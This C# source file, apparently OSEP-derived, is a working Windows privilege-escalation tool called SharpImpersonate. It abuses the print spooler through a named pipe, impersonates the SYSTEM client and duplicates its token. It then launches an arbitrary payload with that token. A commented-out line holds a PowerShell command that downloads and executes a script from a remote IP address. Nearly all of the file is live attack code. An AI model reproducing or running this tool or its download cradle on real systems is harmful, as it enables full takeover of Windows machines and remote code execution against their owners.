using SharpImpersonate.SpoolSample;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static SharpImpersonate.SpoolSample.RDIShellcodeLoader;

namespace SharpImpersonate
{
    class Program
    {
        // StartNamePipe from OSEP

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(
            string lpName,
            uint dwOpenMode,
            uint dwPipeMode,
            uint nMaxInstances,
            uint nOutBufferSize,
            uint nInBufferSize,
            uint nDefaultTimeOut,
            IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe,
            IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(
            IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            uint DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(
            IntPtr pSID,
            out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            UInt32 dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            UInt32 dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        
        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
        
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken,
        bool bInherit);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Boolean bInheritHandle, UInt32 dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Boolean OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean ImpersonateLoggedOnUser(IntPtr hToken);


        public const UInt32 PROCESS_QUERY_INFORMATION = 0x0400;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;

        public const uint TOKEN_ALL_ACCESS = 0xF01FF;
        public const uint PIPE_ACCESS_DUPLEX = 3;
        public const uint PIPE_TYPE_BYTE = 0x00000000;

        public static IntPtr hPipe = IntPtr.Zero;
        public static IntPtr mainThread = IntPtr.Zero;

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        private static void StartNamePipe(string pipeName, string payload)
        {
            try
            {
                hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

                Console.WriteLine("\n[>] Waiting for connection.");

                ConnectNamedPipe(hPipe, IntPtr.Zero);

                Console.WriteLine("\n[>] Connected, Impersonaiting user.");

                ImpersonateNamedPipeClient(hPipe);

                IntPtr hToken;
                OpenThreadToken(mainThread, TOKEN_ALL_ACCESS, false, out hToken);

                int TokenInfLength = 0;
                GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
                IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength); // .NET Marshal.AllocHGlobal method can allocate unmanaged memory
                GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

                TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
                IntPtr pstr = IntPtr.Zero;
                Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                string sidstr = Marshal.PtrToStringAuto(pstr);
                Console.WriteLine(@"[>] Found sid {0}", sidstr);

                Console.WriteLine("[>] Duplicating Token");

                IntPtr hSystemToken = IntPtr.Zero;
                DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out hSystemToken);

                StringBuilder sbSystemDir = new StringBuilder(256);
                IntPtr env = IntPtr.Zero;
                uint res1 = GetSystemDirectory(sbSystemDir, 256);
                bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

                String name = WindowsIdentity.GetCurrent().Name;
                Console.WriteLine($"[>] Impersonate user is: {name}");

                RevertToSelf(); // Because sometimes the SYSTEM token doesn't have SeImpersonatePrivilege so we go back to our default priv

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "WinSta0\\Default"; //Added because the IIS user doesn't have a desktop

                Console.WriteLine("$[>] Launching payload with the Token");
                Console.WriteLine($"    | -> Payload: {payload}");
                //res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
                //res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "powershell -exec bypass -w 1 -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.108:8001/all')", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
                res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, payload, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);

            }
            catch (Exception)
            {
                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                Console.WriteLine("\n[!] StartNamePipe failed. Error: {0}", errorMessage);
                return;
            }

            //return TaskStatus.RanToCompletion;
        }

        private static async Task MainAsync(string payload)
        {
            mainThread = GetCurrentThread();
            string pipeName = "privEsc";
            string hostname = System.Net.Dns.GetHostName();

            var startpipe = Task.Run(() => StartNamePipe(@"\\.\pipe\" + pipeName + @"\pipe\spoolss", payload));
            
            Task.Delay(1000).Wait();
            
            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{hostname} \\\\{hostname + "/pipe/" + pipeName}");

            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);

            Console.WriteLine(startpipe.Status);

            await startpipe;

            Console.WriteLine("Final");
        }

        static void Main(string[] args)
        {
            if (args.Length > 0)
            { 
                string payload = args[0];
                MainAsync(payload).GetAwaiter().GetResult();
            }
            else
            {
                Console.WriteLine("[-] You need to specify your payload.");
            }
        }
    }
}
